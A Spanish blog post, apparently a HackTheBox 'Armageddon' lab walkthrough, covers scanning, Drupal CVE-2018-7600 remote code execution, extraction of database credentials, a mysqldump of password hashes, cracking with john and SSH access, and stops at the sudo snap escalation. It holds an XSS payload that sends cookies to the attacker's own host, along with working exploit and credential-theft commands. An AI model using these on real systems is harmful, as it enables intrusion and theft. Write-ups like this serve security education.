@@ -1,0 +1,1581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Armageddon</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Armageddon | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Armageddon" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Jugaremos con CVEs, romperemos Drupal7 para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete snap malicioso y obtener el privesc." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Jugaremos con CVEs, romperemos Drupal7 para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete snap malicioso y obtener el privesc." />
+<link rel="canonical" href="http://localhost:4000/htb/armageddon" />
+<meta property="og:url" content="http://localhost:4000/htb/armageddon" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-24T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png" />
+<meta property="twitter:title" content="HackTheBox - Armageddon" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-24T00:00:00-07:00","datePublished":"2021-07-24T00:00:00-07:00","description":"Máquina Linux nivel fácil. Jugaremos con CVEs, romperemos Drupal7 para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete snap malicioso y obtener el privesc.","headline":"HackTheBox - Armageddon","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/armageddon"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/armageddon"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Armageddon</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-24">24 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323banner.png" alt="HackTheBox - Armageddon">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Jugaremos con <strong>CVE</strong>s, romperemos <strong>Drupal7</strong> para ejecutar comandos, las malas configuraciones se revelarán y finalmente nos aprovechamos de nuestros permisos para ejecutar un paquete <strong>snap</strong> malicioso y obtener el privesc.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323armageddonHTB.png" alt="323armageddonHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/27897">bertolis</a>.</p>
+
+<p>¡Bueno bueno, a darle pues!</p>
+
+<p>Hola ;) en esta máquina inicialmente nos encontraremos con una versión de <code>Drupal 7</code> vulnerable a ejecucion remota de comandos, aprovecharemos esta brecha para obtener una <strong>fake Shell</strong> y que nos sea más fácil la enumeración… Enumerando encontraremos las credenciales del usuario de la base de datos, las usaremos para ver la data de la tabla <code>users</code>, en la cual existe el usuario <strong>brucetherealadmin</strong> (que es usuario del sistema), tomaremos su contraseña (hash) la crackearemos y probando con ella ante el servicio <code>SSH</code> logramos una sesión válida.</p>
+
+<p>Finalmente validando nuestros permisos de ejecución como usuario <strong><u>root</u></strong>, vemos que podemos correr la instrucción <code>/usr/bin/snap install *</code>, usaremos esto para crearnos un paquete <strong>snap</strong> malicioso que nos permita al mismo tiempo de estar instalándose, una ejecución de comandos, en este caso al estar siendo ejecutada con permisos administrativos estaríamos ejecutándo cada comando como <strong>root</strong>. Usaremos esto para obtener una reverse Shell..</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Tirando a vulns conocidas pero tambien algo juguetona y poco real.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>¿Qué vamo a encontra’?</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-bruce">Movimiento Lateral: Apache -&gt; brucetherealadmin</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezaremos con un escaneo para conocer que puertos tiene abiertos la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.233 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.233
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.233 ()   Status: Up
+Host: 10.10.10.233 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.74 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong></td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://developer.mozilla.org/es/docs/Web/HTTP/Overview">HTTP</a></strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones para tener info más especifica de cada servicio encontrado:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80 -sC -sV 10.10.10.233 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.91 scan initiated Tue Mar 30 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.233
+Nmap scan report for 10.10.10.233
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Mar 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18.08 seconds
+</code></pre>
+
+<p>Obtenemos (varias cositas que veremos despues) por ahora:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.6</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Metámonos con cada servicio a ver por donde entrarle…</p>
+
+<p>…</p>
+
+<p>En cuanto al puerto <strong>22</strong> y su versión no tenemos nada.</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323page80.png" alt="323page80" /></p>
+
+<p>Tenemos un panel login, donde también podemos registrarnos… Antes de empezar a recorrer la página, creémonos una cuenta (o intentemos) a ver que hay dentro…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323page80_error_register.png" alt="323page80_error_register" /></p>
+
+<p>El mensaje de error es medio interesante, ya que no nos va a dejar entrar :P Pero también habla de que nuestra cuenta esta a la espera de ser aprobada por un administrador… Con esto podríamos pensar en registrarnos con algún nombre tipo:</p>
+
+<pre><code class="language-js">&lt;script&gt;document.write('&lt;img src="http://&lt;nuestra_ip&gt;/cualquiercosita.jpg?cookie=' + document.cookie + '"&gt;')&lt;/script&gt;
+</code></pre>
+
+<p>Levantaríamos un servidor web y lanzaríamos esa línea para que cuando el administrador valide nuestro usuario lográramos en teoría obtener su cookie, pero igual al intentarlo nos detecta los caracteres extraños y no nos deja registrarnos…</p>
+
+<p>Podemos volver a nuestro escaneo de <code>nmap</code> y fijarnos que tenemos un <code>Drupal 7</code>, veamos si hay algunas vulnerabilidades relacionadas con él…</p>
+
+<blockquote>
+  <p><strong>Drupal</strong> es un gestor de contenidos, hecho para la publicacion pricnipalmente de articulos, que tambien permite generar foros, encuestas, blogs… <a href="https://www.fullweb.es/blog/drupal-que-es-y-por-que-deberias-utilizarlo">¿Qué es <strong>Drupal</strong>?</a></p>
+</blockquote>
+
+<p>Bien, revisando la versión <code>7</code> que tenemos, nos encontramos un <strong>CVE</strong> bastante interesante…</p>
+
+<ul>
+  <li><a href="https://www.drupal.org/sa-core-2018-002"><strong>Advisory</strong> Drupal 7.x and 8.x - RCE - affecting multiple subsystems with default or common module configurations</a>.</li>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600"><strong>CVE-2018-7600</strong> Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows RCE</a>.</li>
+</ul>
+
+<p>Vale vale, malas configuraciones permiten ejecución remota de comandos, al parecer lo llaman <strong>Drupalgeddon</strong>, profundizando encontramos algunos recursos por si les quieren echar un ojo:</p>
+
+<ul>
+  <li><a href="https://es-la.tenable.com/blog/drupalgeddon-attacks-continue-on-sites-missing-security-updates-cve-2018-7600-cve-2018-7602">Drupalgeddon Attacks Continue on Sites Missing Security Updates (CVE-2018-7600, CVE-2018-7602)</a>.</li>
+  <li><a href="https://blog.rapid7.com/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted/">Drupalgeddon Vulnerability - What is it? Are You Impacted? (ta lindo este)</a>.</li>
+  <li><a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">How <strong>Drupalgeddon 2</strong> works (guapetón)</a>.</li>
+</ul>
+
+<p>Ahora sí, veamos que exploits hay y como podemos aprovecharlos…</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Nos encontramos bastantes, entre ellos destaqué 3, todos se aprovechan del envenenamiento del proceso al regenerar una contraseña para subir un archivo vía <a href="https://developer.mozilla.org/es/docs/Web/Guide/AJAX">AJAX</a> y lograr <code>RCE</code>:</p>
+
+<ol>
+  <li><a href="https://github.com/dreadlocked/Drupalgeddon2">Ruby - https://github.com/dreadlocked/Drupalgeddon2</a>, genera Fake Shell.</li>
+  <li><a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py">Python3 - https://github.com/pimps/CVE-2018-7600</a>, muestra salida limpia.</li>
+  <li><a href="https://github.com/FireFart/CVE-2018-7600">Python3 - https://github.com/FireFart/CVE-2018-7600</a>, es el más fácil de leer, por lo tanto de entender que hace.</li>
+</ol>
+
+<p>Claramente no tenemos una <code>Shell</code> aún, el primer recurso nos genera una Fake Shell, o sea que simula como si estuviéramos en una, pero no, el claro ejemplo es si intentamos hacer <code>cd ..</code> no nos va a mover del directorio donde estamos. Así que simplemente está ejecutando los comandos y nos los muestra como si fuera una Shell…</p>
+
+<p>Después de jugar con los 3 (y otros) nos damos cuenta de que la máquina no tiene <code>nc</code>, no nos deja ejecutar ninguna reverse Shell (ni con <strong>Py</strong>, ni <strong>PHP</strong>, ni <strong>Perl</strong>, ni <strong>bash</strong>, ni etc.), ya que obtenemos un lindo “permiso denegado”. (O pues yo no pude :P)</p>
+
+<p>Pasa lo mismo si intentamos usar <code>cURL</code> hacia nuestro archivo con contenido de <code>bash</code>… Así que la única opción es que debamos encontrar algo dentro de la máquina (podemos apoyarnos de le <strong>FakeShell</strong>) que nos permita después usar el puerto <code>22</code>…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_execCVEruby.png" alt="323bash_execCVEruby" /></p>
+
+<p>Ahora a enumerar…</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-bruce">Apache -&gt; brucetherealadmin <a href="#movimiento-lateral-bruce">#</a></h2>
+
+<p><strong>(</strong></p>
+
+<p>Usando el otro exploit logramos ver que servicios hay localmente, ya que el de Ruby nos da <code>TimeOut</code> :(</p>
+
+<pre><code class="language-bash">❭ python3 CVE-2018-7600/drupa7-CVE-2018-7600.py http://10.10.10.233 -c "netstat -a"
+
+=============================================================================
+|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
+|                              by pimps                                     |
+=============================================================================
+
+[*] Poisoning a form and including it in cache.
+form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg
+[*] Poisoned form ID: form--zYYkruK6jQ12BhgbrJrxrrszD0nEpeEs_2BURlHjsg
+[*] Triggering exploit to execute: netstat -a
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+...
+</code></pre>
+
+<p><strong>)</strong></p>
+
+<p>Pero no nos enfocaremos en esto, sigamos enumerando…</p>
+
+<p>No tenemos permisos para listar el directorio <code>/home</code>, pero podemos ver el archivo <code>/etc/passwd</code> y así saber que usuarios hay en el sistema:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+...
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+</code></pre>
+
+<p>Perfecto, simplemente tenemos al usuario <code>brucetherealadmin</code> siendo relevante (que de ahora en adelante le diremos <code>bruce</code> :P), así que entiendo que debemos pivotear a él…</p>
+
+<p>Dándole vueltas a los archivos que tenemos en el directorio <code>/var/www/html</code> nos encontramos uno con contenido llamativo:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; ls -la sites
+total 12
+drwxr-xr-x. 4 apache apache   75 Jun 21  2017 .
+drwxr-xr-x. 9 apache apache 4096 Apr  1 01:35 ..
+-rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt
+drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all
+dr-xr-xr-x. 3 apache apache   67 Dec  3 12:30 default
+-rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php
+armageddon.htb&gt;&gt; ls -la sites/default
+total 56
+dr-xr-xr-x. 3 apache apache    67 Dec  3 12:30 .
+drwxr-xr-x. 4 apache apache    75 Jun 21  2017 ..
+-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
+drwxrwxr-x. 3 apache apache    37 Dec  3 12:32 files
+-r--r--r--. 1 apache apache 26565 Dec  3 12:32 settings.php
+</code></pre>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; cat sites/default/settings.php
+</code></pre>
+
+<pre><code class="language-php">...
+$databases = array (
+  'default' =&gt;
+  array (
+    'default' =&gt;
+    array (
+      'database' =&gt; 'drupal',
+      'username' =&gt; 'drupaluser',
+      'password' =&gt; 'CQHEy@9M*m23gBVj',
+      'host' =&gt; 'localhost',
+      'port' =&gt; '',
+      'driver' =&gt; 'mysql',
+      'prefix' =&gt; '',
+    ),
+  ),
+);
+...
+$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';
+...
+</code></pre>
+
+<p>Opa, las credenciales de un usuario de la base de datos y un <code>salt</code> llamativo, podemos probar esa contraseña contra el usuario <code>bruce</code> por medio de <code>SSH</code> a ver quee:</p>
+
+<pre><code class="language-bash">❭ ssh brucetherealadmin@10.10.10.233
+brucetherealadmin@10.10.10.233's password: 
+Permission denied, please try again.
+</code></pre>
+
+<p>Pero no, así que veamos si podemos usar las herramientas relacionadas con <code>mysql</code> y ver si dentro de la base de datos <code>drupal</code> hay algo que nos sirva contra <code>bruce</code>.</p>
+
+<p>Probando <code>mysql</code> nos da error (al no tener una consola interactiva), podemos probar con <a href="https://www.thegeekstuff.com/2008/08/get-quick-info-on-mysql-db-table-column-and-index-using-mysqlshow/">mysqlshow</a> para ver que bases de datos existen:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqlshow -u drupaluser -p 
+Enter password: mysqlshow: Access denied for user 'drupaluser'@'localhost' (using password: NO)
+</code></pre>
+
+<p>No nos permite ingresar la contraseña, pero en este caso haciendo una búsqueda rápida encontramos la solución en <a href="https://stackoverflow.com/questions/12665522/is-there-a-way-to-pass-the-db-user-password-into-the-command-line-tool-mysqladmi#answer-12665543">Stack Overflow</a>, simplemente juntamos la contraseña a la letra <code>-p</code> yyy:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj
++--------------------+
+|     Databases      |
++--------------------+
+| information_schema |
+| drupal             |
+| mysql              |
+| performance_schema |
++--------------------+
+</code></pre>
+
+<p>Perfe, tenemos las bases de datos disponibles en el sistema… Y validamos que existe <code>drupal</code>. Ahora podemos empezar a meternos entre la base de datos y explorar las tablas:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqlshow -u drupaluser -pCQHEy@9M*m23gBVj drupal
+Database: drupal               
++-----------------------------+
+|           Tables            |
++-----------------------------+
+| actions                     |
+| authmap                     |
+...
+| users                       |
+...
+| users_roles                 |
+| variable                    |
+| watchdog                    |
++-----------------------------+
+</code></pre>
+
+<p>Podemos ver cada tabla, pero veremos su estructura más no su contenido… Acá podemos apoyarnos de <a href="https://www.sqlshack.com/how-to-backup-and-restore-mysql-databases-using-the-mysqldump-command/">mysqldump</a>, el cual se encarga de generar un <strong>backup</strong> de la base de datos que le indiquemos, por lo tanto va a dumpear todo el contenido y la estructura de las tablas:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal
+</code></pre>
+
+<p>El output es gigante, peeeero como lo que nos interesa es validar el contenido de la tabla <code>users</code>, simplemente buscamos por eso:</p>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "users"
+...
+CREATE TABLE `users` (
+-- Dumping data for table `users`
+...
+</code></pre>
+
+<pre><code class="language-bash">armageddon.htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "Dumping data for table \`users\`"
+-- Dumping data for table `users`
+armageddon.htb&gt;&gt; mysqldump -u drupaluser -pCQHEy@9M*m23gBVj drupal | grep "Dumping data for table \`users\`" -A 10
+-- Dumping data for table `users`
+--
+
+LOCK TABLES `users` WRITE;
+/*!40000 ALTER TABLE `users` DISABLE KEYS */;
+INSERT INTO `users` VALUES (0,'','','','','',NULL,0,0,0,0,NULL,'',0,'',NULL),(1,'brucetherealadmin','$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt','admin@armageddon.eu','','','filtered_html',1606998756,1607077194,1607076276,1,'Europe/London','',0,'admin@armageddon.eu','a:1:{s:7:\"overlay\";i:1;}'),(3,'test','$S$DwIeAxnNRIh9nffiwqM.hpZpekF1HtLtbpHP1IvRoF7ASRB12D.4','test@gmail.com','','','filtered_html',1617249869,0,0,0,'Europe/London','',0,'test@gmail.com',NULL);
+/*!40000 ALTER TABLE `users` ENABLE KEYS */;
+UNLOCK TABLES;
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_ruEX_mysqldump_usersTable.png" alt="323bash_ruEX_mysqldump_usersTable" /></p>
+
+<p>Listos, vemos información útil sobre el usuario <code>bruce</code>, tenemos un <code>hash</code>, que según <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">los ejemplos de hashes</a> de <code>hashcat</code> es de tipo <code>Drupal7</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323google_wiki_examples_drupalHash.png" alt="323google_wiki_examples_drupalHash" /></p>
+
+<p>Bien, entonces mediante <code>hashcat</code> o <code>john</code> podemos intentar crackear el hash, lo guardamos en un archivo y:</p>
+
+<pre><code class="language-bash">❭ cat hash_drupal_bruce 
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+</code></pre>
+
+<pre><code class="language-bash">❭ john --wordlist=/usr/share/wordlists/rockyou.txt hash_drupal_bruce 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 32768 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+booboo           (?)
+1g 0:00:00:02 DONE (2021-03-31 25:25) 0.4484g/s 104.0p/s 104.0c/s 104.0C/s courtney..harley
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p><strong>booboo</strong>, jmmm intentemos ahora con esa contraseña ante <strong>SSH</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/armageddon/323bash_sshBruce_done.png" alt="323bash_sshBruce_done" /></p>
+
+<p>Listos, tamos dentro…</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumerando los permisos que tenemos, vemos algo interesante:</p>
+
+<pre><code class="language-bash">[brucetherealadmin@armageddon shm]$ sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+</code></pre>
+
+<p>Podemos ejecutar el binario <code>/usr/bin/snap</code> para instalar todo lo que tengamos en la ruta actual (<code>*</code>). Esto con permisos de administrador, o sea que cuando ejecutemos el proceso anterior, se estará ejecutando (si agregamos <code>sudo</code> al inicio) como <strong>root</strong>.</p>
+
+<blockquote>
+  <p><strong>snap</strong> podemos imaginarlo como <strong>Docker</strong> y las imagenes, donde ellas funcionan como un conjunto de de dependencias que conforman una aplicación. Esto mismo pasa con los paquetes <code>.snap</code>, nos permiten «empaquetar» una aplicación en un archivo (paquete realmente, solo que ya la repeti mucho :P).</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://hipertextual.com/2018/12/snaps-instalar-software-linux"><strong>Snap</strong> para instalar software en Linux</a>.</li>
